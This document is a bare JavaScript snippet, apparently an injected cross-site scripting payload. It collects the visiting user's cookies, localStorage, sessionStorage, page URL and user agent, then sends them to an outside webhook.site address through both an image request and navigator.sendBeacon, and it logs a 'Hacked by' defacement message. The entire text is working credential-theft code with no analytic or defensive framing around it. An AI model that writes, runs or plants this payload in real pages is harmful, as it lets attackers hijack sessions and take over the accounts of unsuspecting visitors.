(function() {
  const webhook = 'https://webhook.site/4af52c09-667c-425f-9767-f20efcf8aef0';
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    userAgent: navigator.userAgent
  };
  const payload = encodeURIComponent(JSON.stringify(data));
  new Image().src = webhook + '?data=' + payload;
  navigator.sendBeacon(webhook + '?data=' + payload);
  console.log('Hacked by Vsemirnaya Volonterskaya Organizatsiya');
})();
